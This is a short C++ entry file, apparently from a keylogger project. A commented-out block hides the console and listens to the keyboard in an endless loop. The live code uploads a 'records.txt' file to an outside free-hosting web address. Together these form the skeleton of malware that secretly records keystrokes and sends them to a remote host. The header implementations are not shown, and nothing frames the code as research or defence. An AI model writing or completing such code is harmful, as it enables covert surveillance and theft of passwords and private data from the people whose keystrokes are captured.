
#include <iostream>
#include "Keylogger.hpp"
#include "Request.hpp"


int main()
{
    /*
    Keylogger key;
    key.showConsole();
    //key.hideConsole();
    while (true) {
        key.listenKeyboard();
    }
    */

    Request r;
    r.request("https://johndoedev.000webhostapp.com/", "records.txt");

}

